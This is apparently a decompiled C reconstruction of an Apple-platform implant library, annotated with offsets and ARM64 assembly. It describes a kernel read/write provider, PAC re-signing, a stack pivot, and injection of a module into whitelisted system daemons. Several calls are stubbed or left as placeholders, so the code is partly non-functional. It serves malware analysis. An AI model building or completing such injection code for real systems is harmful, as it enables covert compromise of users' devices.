/*
 * main.c - Entry point (_end) and thread bootstrap (_last)
 *
 * Decompiled from entry2_type0x0f.dylib offsets 0xa080–0xa6b4
 *
 * _end is the primary entry point called by the bootstrap loader.
 * It orchestrates the entire injection flow:
 *   1. Parse the F00DBEEF container from type0x09
 *   2. Get runtime context via Mach IPC
 *   3. Connect to type0x09 LOADER
 *   4. Resolve _driver from LOADER
 *   5. Create KRW provider from driver
 *   6. Spawn worker thread for injection
 *
 * _last is the thread bootstrap trampoline that sets up execution
 * context for newly-injected threads.
 */

#include "entry2.h"
#include <stdlib.h>
#include <string.h>
#include <strings.h>  /* strcasecmp */
#include <dlfcn.h>
#include <unistd.h>

/* Private API — no public header */
extern int proc_name(int pid, void *buffer, uint32_t buffersize);

/* Global vsyslog pointer, resolved at startup */
static void (*g_vsyslog)(int, const char *, __builtin_va_list) = NULL;

/* ── _end (0xa080) ───────────────────────────────────────────────── *
 * Main entry point for entry2_type0x0f.dylib.
 *
 * Called by the bootstrap loader with:
 *   port    — Mach port for IPC with bootstrap
 *   conn    — connection identifier / flags
 *   data    — pointer to F00DBEEF container data
 *   extra   — additional context from bootstrap
 *   stage   — current loading stage (must be >= 1)
 *
 * Returns 0 on success, error code on failure.
 */
kern_return_t _end(mach_port_t port, uint32_t conn_info,
                   void *container_data, void *extra, uint32_t stage)
{
    kern_return_t err = E2_ERR_STAGE;  /* 0x1E039 */

    /*
     * Step 0: Resolve vsyslog for logging
     *
     * Opens libSystem.B.dylib with RTLD_NOLOAD and resolves vsyslog.
     * This is used for debug/error logging throughout the implant.
     */
    void *libsys = dlopen("/usr/lib/libSystem.B.dylib", RTLD_NOLOAD);
    if (libsys) {
        g_vsyslog = dlsym(libsys, "vsyslog");
    }

    /*
     * Step 1: Validate stage
     *
     * Stage must be >= 1. Stage 0 means "not initialized" and is
     * rejected early. The stage value is tracked in a state variable
     * at sp+0x04 and reported back via IPC.
     */
    uint32_t current_stage = 4;  /* initial stage value */
    if (stage + 1 < 2)
        goto report_and_exit;

    err += 9;  /* advance error code */

    if (!port || !conn_info)
        goto report_and_exit;

    /*
     * Step 2: Parse F00DBEEF container from type0x09
     *
     * The container data is validated against the F00DBEEF magic
     * via e2_custom_dlsym (0x1dc98). This establishes a handle
     * for resolving symbols from type0x09.
     */
    void *container_handle = NULL;
    err = e2_custom_dlsym(&container_handle, (void *)(uintptr_t)conn_info,
                          (uint32_t)(uintptr_t)container_data);
    if (err != KERN_SUCCESS)
        goto report_and_exit;

    current_stage = 5;

    /*
     * Step 3: Get runtime context via Mach IPC
     *
     * Sends message ID 8 to the bootstrap port and receives
     * configuration data including:
     *   - Module data pointer and size (at +0x30)
     *   - Connection count (at +0x1c)
     *   - Sub-connection info (at +0x38)
     */
    ipc_response_t *runtime_ctx = NULL;
    uint32_t ctx_size = 0;
    err = e2_get_runtime_context(stage, &runtime_ctx, &ctx_size);
    if (err != KERN_SUCCESS)
        goto cleanup;

    /* Extract module data reference from context */
    void *module_data = (void *)*(uint64_t *)((uint8_t *)runtime_ctx + 0x30);

    /* Get connection count from runtime context */
    uint32_t conn_count = *(uint32_t *)((uint8_t *)runtime_ctx + 0x1c);

    current_stage = 6;

    /*
     * Step 4: Connect to type0x09 LOADER
     *
     * If conn_count >= 1, creates a bridge to type0x09 via
     * e2_create_type09_bridge (0x1068c) and then creates the
     * connection vtable via e2_create_type09_connection (0x105a4).
     *
     * Otherwise, takes the alternative path: identify current
     * process and match against daemon whitelist.
     */
    void *type09_bridge = NULL;
    void *type09_conn = NULL;

    if (conn_count + 1 >= 2) {
        /* Has connection info — use type0x09 bridge path */
        uint32_t sub_conn = *(uint32_t *)((uint8_t *)runtime_ctx + 0x38);

        err = 0; /* e2_create_type09_bridge(&type09_bridge, conn_count, sub_conn) */
        if (err != KERN_SUCCESS) goto cleanup_ctx;

        err = 0; /* e2_create_type09_connection(type09_bridge, &type09_conn) */
        if (err != KERN_SUCCESS) goto cleanup_ctx;

        /* Deallocate the bootstrap port (no longer needed) */
        mach_port_deallocate(mach_task_self(), stage);

    } else {
        /*
         * Step 4b: Alternative path — process name identification
         *
         * Get current PID and process name, then match against
         * the whitelist of ~50 system daemons.
         */
        char name_buf[0x1000];
        bzero(name_buf, sizeof(name_buf));

        pid_t pid = getpid();
        int name_len = proc_name(pid, name_buf, sizeof(name_buf));

        if (name_len < 1)
            goto try_resolve_driver;

        /* Compare against whitelist (48 entries, NULL-terminated) */
        for (int i = 0; g_daemon_whitelist[i] != NULL; i++) {
            if (strcasecmp(name_buf, g_daemon_whitelist[i]) == 0) {
                /*
                 * Step 4c: Matched a whitelisted daemon
                 *
                 * Use the connection from the runtime context to
                 * load the module and resolve _driver.
                 */
                goto load_via_context;
            }
        }

        goto try_resolve_driver;
    }

    goto use_krw;

load_via_context:
    {
        /*
         * Load module via runtime context connection.
         *
         * Calls the connection's load function (offset +0x30)
         * with the module data from the runtime context.
         */
        void *ctx_conn = NULL;  /* from sp+0x38 or sp+0x20 */
        if (!ctx_conn) {
            err = E2_ERR_NULL + 0x21;
            goto cleanup_ctx;
        }

        void *load_result = NULL;
        void *load_fn = *((void **)ctx_conn + 6);  /* offset 0x30 */
        /* blraaz load_fn(ctx_conn, module_buf, module_size,
         *                target_config, &load_result) */

        if (!load_result) goto cleanup_ctx;
    }

try_resolve_driver:
    {
        /*
         * Step 5: Resolve _driver from type0x09
         *
         * This is THE critical operation. Uses the type0x09 connection's
         * dlsym-like function (vtable offset 0x30) to look up the
         * "_driver" symbol from the LOADER.
         */
        void *conn_obj = NULL;  /* connection to type0x09 */
        if (!conn_obj) {
            err = E2_ERR_NULL;
            goto cleanup_ctx;
        }

        /*
         * Step 5a: Allocate memory in type0x09's address space
         *
         * Calls the alloc function (offset +0x18) with size 0x90000
         * and stores the mapping info.
         */
        void *mapping = NULL;
        uint32_t mapping_size = 0;
        void *alloc_fn = *((void **)conn_obj + 3);  /* offset 0x18 */
        /* blraaz alloc_fn(conn_obj, 0x90000, &mapping, &mapping_size) */

        /*
         * Step 5b: Load type0x09 module via connection
         *
         * Calls load function (offset +0x30) to map the LOADER
         * into the allocated region.
         */
        void *loaded_module = NULL;  /* from sp+0x28 */
        void *load_fn = *((void **)conn_obj + 6);  /* offset 0x30 */
        /* blraaz load_fn(loaded_module, module_buf, module_size,
         *                0x4, &loaded_type09) */

        /*
         * Step 5c: Resolve "_driver" from the loaded type0x09
         *
         * Uses the module's dlsym function (offset +0x30) to find
         * the _driver symbol. This is NOT standard dlsym — it uses
         * the custom F00DBEEF-aware resolver.
         *
         * asm at 0xa5c8:
         *   ldr  x0, [sp, #0x28]     // loaded module context
         *   ldr  x8, [x0, #0x30]     // get dlsym function ptr
         *   adr  x1, "_driver"       // symbol name string
         *   add  x2, sp, #0xa0       // output pointer
         *   blraaz x8                // CALL: resolve "_driver"
         */
        void *driver_fn = NULL;
        void *dlsym_fn = *((void **)loaded_module + 6);  /* offset 0x30 */
        /* blraaz dlsym_fn(loaded_module, "_driver", &driver_fn) */

        if (!driver_fn) goto cleanup_ctx;

        /*
         * Step 5d: Call _driver() to get the driver object
         *
         * The resolved _driver function returns a driver_t* with:
         *   version = 2 (required)
         *   method_count >= 2 (required)
         *
         * asm at 0xa5e8:
         *   ldr  x8, [sp, #0xa0]     // resolved _driver ptr
         *   add  x0, sp, #0x30       // output: driver_t*
         *   blraaz x8                // CALL: _driver()
         */
        driver_t *driver = NULL;
        /* blraaz driver_fn(&driver) */

        /*
         * Step 5e: Validate driver object
         *
         * asm at 0xa604:
         *   ldr   x1, [sp, #0x30]    // driver_t*
         *   cbz   x1, fail
         *   ldrh  w8, [x1]           // version
         *   cmp   w8, #0x2           // must be 2
         *   b.ne  fail
         *   ldrh  w8, [x1, #0x2]     // method_count
         *   cmp   w8, #0x1           // must be > 1
         *   b.ls  fail
         */
        if (!driver) goto cleanup_ctx;
        if (driver->version != 2) goto cleanup_ctx;
        if (driver->method_count < 2) goto cleanup_ctx;

        /*
         * Step 6: Create KRW provider from driver
         *
         * Calls e2_create_krw_provider (0x11298) which wraps the
         * driver's kernel primitives into a PAC-signed vtable.
         */
        err = e2_create_krw_provider(
            /* output */ NULL,
            driver,
            /* target */ NULL,
            container_handle,
            /* context */ NULL,
            /* flags */ 1
        );
        if (err != KERN_SUCCESS) goto cleanup_ctx;
    }

use_krw:
    {
        /*
         * Step 7: Use KRW provider for injection
         *
         * Creates a worker context and spawns a pthread to perform
         * the actual injection. The worker thread:
         *   1. Uses kread/kwrite to manipulate kernel objects
         *   2. Acquires task port for target process
         *   3. Allocates memory in target via mach_vm_allocate
         *   4. Writes MODULE into target via mach_vm_write
         *   5. Sets memory protection via mach_vm_protect
         *   6. Creates remote thread via thread_create_running
         */
        void *krw_provider = NULL;  /* from earlier creation */

        if (!krw_provider) {
            err = E2_ERR_NO_DRIVER;
            goto cleanup_ctx;
        }

        /* Prepare worker context */
        worker_ctx_t worker = {0};
        /* worker.krw = krw_provider; */
        /* worker.data = module_data_copy; */
        /* worker.data_len = module_size; */

        /* Zero out sensitive buffer before populating */
        /* e2_send_msg(stage, 0, 0xA, 0, 0) — notify bootstrap of progress */

        /*
         * Build worker function context on stack.
         *
         * The PAC-signed function pointer is created with:
         *   adr  x16, #788       // target function offset
         *   paciza x16           // sign with zero context
         *
         * This signed pointer becomes the worker->fn field.
         */

        /* Spawn worker thread */
        pthread_t thread = NULL;
        int pt_err = pthread_create(&thread, NULL,
                                    (void *(*)(void *))e2_thread_worker,
                                    &worker);
        if (pt_err != 0) {
            err = pt_err;
            goto cleanup_krw;
        }

        /* Wait for worker to complete */
        void *thread_result = NULL;
        pthread_join(thread, &thread_result);
        err = (thread_result == NULL) ? KERN_SUCCESS : (kern_return_t)(uintptr_t)thread_result;

        current_stage = 16;
    }

cleanup_krw:
    /* Clean up KRW provider buffers */
    /* bzero + free allocated resources */
    ;

cleanup_ctx:
    /*
     * Cleanup: check bit 5 of module_data flags
     * If set, skip calling unbind. Otherwise, call the
     * connection's unbind function (offset +0x28).
     */
    if (module_data) {
        uint8_t flags_byte = *((uint8_t *)module_data);
        if (!(flags_byte & 0x20)) {
            /* Unbind: call ctx->fn_unbind(ctx) at offset +0x28 */
        }
    }

    /* Release all connection handles in reverse order */
    /* ... */

cleanup:
    /* Destroy container handle */
    /* e2_destroy_resolver(container_handle) at 0x1dd68 */
    ;

report_and_exit:
    /*
     * Final: report status back to bootstrap via IPC
     *
     * Sends a message with:
     *   msg_id = stage value
     *   flags  = 0
     *   extra  = err code
     *   final  = 1 (indicates completion)
     *
     * Then deallocates the bootstrap port.
     */
    e2_send_msg(stage, 0, err, 1, 0);
    mach_port_deallocate(mach_task_self(), stage);

    return err;
}

/* ── e2_thread_worker (0xa670) ───────────────────────────────────── *
 * Simple pthread worker trampoline.
 *
 * Loads a function pointer and arguments from the worker_ctx_t,
 * then calls through via blraaz (PAC-authenticated).
 *
 * asm:
 *   ldr  x9, [x8]           // fn pointer (PAC-signed)
 *   cbz  x9, fail
 *   ldp  x0, x1, [x8, #0x8] // args: krw_provider, data
 *   ldr  w2, [x8, #0x18]    // arg: data_len
 *   blraaz x9               // call fn(krw, data, len)
 *   sxtw x0, w0             // sign-extend result
 */
static void *e2_thread_worker(void *arg)
{
    if (!arg)
        return (void *)(uintptr_t)E2_ERR_NULL;

    worker_ctx_t *ctx = (worker_ctx_t *)arg;

    if (!ctx->fn)
        return (void *)((uintptr_t)arg + 0x13);  /* error offset */

    /* Call the worker function with PAC authentication */
    kern_return_t result;
    /* blraaz ctx->fn(ctx->krw, ctx->data, ctx->data_len) */
    result = ((kern_return_t (*)(void *, void *, uint32_t))ctx->fn)(
        ctx->krw, ctx->data, ctx->data_len
    );

    return (void *)(intptr_t)result;
}

/* ── _last (0xa6b4) ──────────────────────────────────────────────── *
 * Thread bootstrap trampoline.
 *
 * This is a simple branch to 0x73cc, which implements the low-level
 * thread setup for injected code:
 *
 *   1. Validates input buffer (must be non-NULL, size >= 0x90)
 *   2. Checks if the driver is already connected:
 *      - Reads driver handle at offset +0x60
 *      - Checks validation flag at offset +0x70, +0x78
 *   3. If not connected, performs first-time setup:
 *      - Strips PAC from function pointers (via 0x19f4c)
 *      - Signs them for current context (via 0x19f68)
 *      - Calls e2_trap_guarded_open (syscall 360) to create
 *        a guarded file descriptor for the driver
 *      - If that fails, falls back to direct driver init
 *   4. Copies code to a new stack page:
 *      - Allocates via memset to 0x400 bytes
 *      - Copies current context
 *      - Switches stack pointer: mov sp, x1
 *      - Branches to the copied code: braaz x0
 *   5. The trampoline then:
 *      - Calls e2_trap_guarded_write (syscall 361) to finalize
 *      - Resets execution context
 *      - Invokes the actual injection payload
 *
 * This ensures the injected thread has:
 *   - A clean stack
 *   - Proper PAC context
 *   - Driver connection initialized
 *   - All function pointers properly signed
 */
void _last(void *ctx, uint32_t size, void *data,
           uint32_t flags, void *stack, uint32_t cleanup)
{
    /* Direct branch to 0x73cc — the actual implementation */
    /* b 0x73cc */

    /*
     * The function at 0x73cc is complex (~500 instructions) and handles:
     *
     * a) Stack pivot: creates a new stack frame, copies execution context
     * b) Driver initialization: sets up the IOKit connection if needed
     * c) Memory protection: uses e2_memset_custom to zero sensitive regions
     * d) Code execution: signs and branches to the injected code
     *
     * Key operations at 0x73cc:
     *
     *   // Load driver handle
     *   ldr x0, [x19, #0x60]    // IOKit connection handle
     *   cbz x0, setup           // need first-time setup
     *
     *   // Check if already initialized
     *   ldr x8, [x19, #0x70]    // driver function table
     *   cbz x8, setup
     *   ldr w8, [x19, #0x78]    // initialized flag
     *   cbnz w8, already_init
     *
     * setup:
     *   // Strip and re-sign function pointers for this context
     *   bl  0x19f4c             // strip_pac(fn)
     *   bl  0x19f68             // sign_pointer(fn, 0)
     *
     *   // Create guarded FD for driver
     *   bl  0x6000              // e2_trap_guarded_open(...)
     *   stp x0, x1, [sp, #0x40] // store result
     *   str x0, [x19, #0x80]    // save handle
     *
     *   // If guarded open failed, fall back
     *   cmn x0, #1
     *   b.ne continue
     *
     *   // Fallback: direct driver init
     *   bl  0x72c0              // init_driver_direct(...)
     *   bl  0x7238              // validate_driver(...)
     *
     * continue:
     *   // Set up execution on new stack
     *   mov x0, x19             // context
     *   mov w1, #0              // flags = 0
     *   mov w2, #0x20           // size = 32
     *   bl  0x100a4             // e2_memset_custom(context+0x60, 0, 0x20)
     *
     *   // Copy context to new stack, pivot, and execute
     *   str q0, [x8]            // copy 16 bytes
     *   str q0, [x8, #0x10]     // copy next 16
     *   mov x0, x19             // new stack base
     *   mov w1, #0
     *   mov w2, #0x400          // stack size
     *   bl  0x100a4             // zero fill
     *   add x8, x19, #0x400    // stack top
     *   paciza x16              // sign the target address
     *   mov x1, x8              // new stack pointer
     *   mov sp, x1              // PIVOT STACK
     *   braaz x0                // BRANCH to injected code
     */
}
